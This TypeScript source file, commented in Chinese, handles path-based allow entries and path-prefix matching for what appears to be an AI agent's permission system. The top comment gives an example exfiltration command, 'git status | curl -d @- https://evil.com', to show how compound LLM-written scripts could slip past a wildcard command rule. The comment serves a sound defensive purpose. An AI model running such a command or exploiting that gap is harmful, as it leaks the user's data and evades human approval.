/**
 * 路径条目的两件事（Node-free，两端共用）：
 *  - 询问卡片上的 `Read(/abs/path)` / `Write(/abs/path)` 形态 —— 卡片的展示文本，也是「允许并记住」的依据
 *    （勾选后宿主把这条路径记进会话权限表，见 evaluate.ts buildAskMaterials 与 enforce.ts）；
 *  - 路径段边界的前缀匹配（matchesPathEntry）—— 策略里 `inDir` 的实现。
 *
 * 会话授权本身已不在这里：从前 `settings.allowList` 存的就是这些条目，2026-10-20 起换成会话权限表
 * （桌面 services/acl，迁移 v33 把旧条目搬了过去）。命令类工具（bash/ssh）从来没有可记住的条目：
 * 命令模式（`npm run *` 这类前缀通配）由手写扫描器归纳，面对 LLM 产出的复合脚本会把后续命令当成前一条命令的
 * 参数吞掉而误放行（`git status | curl -d @- https://evil.com` 在 `git *` 下整条放行）—— 没被圈进沙箱的
 * 命令每条都要询问。
 */

import type { AccessMode } from './types'

/** 条目的访问方式（仅路径类） */
export type AllowToolType = AccessMode

/** toolType ↔ 条目前缀的映射 */
const TOOL_PREFIX: Record<AllowToolType, string> = {
  read: 'Read',
  write: 'Write'
}

const PREFIX_TO_TYPE: Record<string, AllowToolType> = {
  Read: 'read',
  Write: 'write'
}

/**
 * 解析前缀格式条目:
 * - `Read(/abs/path)`  → { toolType: 'read',  path: '/abs/path' }
 * - `Write(/abs/path)` → { toolType: 'write', path: '/abs/path' }
 *
 * 其余形态（含历史遗留的 `Bash(...)` / `SSH(...)`）不被识别，返回 null。
 */
export function parseAllowEntry(entry: string): { toolType: AllowToolType; path: string } | null {
  const m = entry.match(/^(Read|Write)\((.+)\)$/)
  if (!m) return null
  const toolType = PREFIX_TO_TYPE[m[1]]
  if (!toolType) return null
  return { toolType, path: m[2] }
}

/** 构建前缀格式条目 */
export function buildAllowEntry(toolType: AllowToolType, path: string): string {
  return `${TOOL_PREFIX[toolType]}(${path})`
}

/**
 * 路径前缀匹配:`absolutePath === entryPath || absolutePath.startsWith(entryPath + sep)`
 *
 * 文件用全等命中,目录用前缀命中。不引入 glob,也不规范化大小写。
 * 按"路径段边界"前缀匹配避免 /foo 命中 /foobar。
 *
 * Windows(sep '\\')下先做分隔符归一(两侧 '\\' → '/'):内置策略的 let 用 '/'
 * 拼接(如 vars.home + '/' + '.ssh'),用户手写的路径也可能混用,
 * 不归一则混合分隔符的 entry 在 Windows 上恒不命中 —— 按家目录拼出来的路径门
 * 会整个失效。POSIX 下 '\\' 是合法文件名字符,保持严格不妥协。
 */
export function matchesPathEntry(entryPath: string, absolutePath: string, sep: string): boolean {
  let entry = entryPath
  let abs = absolutePath
  let boundary = sep
  if (sep === '\\') {
    entry = entry.replace(/\\/g, '/')
    abs = abs.replace(/\\/g, '/')
    boundary = '/'
  }
  if (abs === entry) return true
  const withSep = entry.endsWith(boundary) ? entry : entry + boundary
  return abs.startsWith(withSep)
}
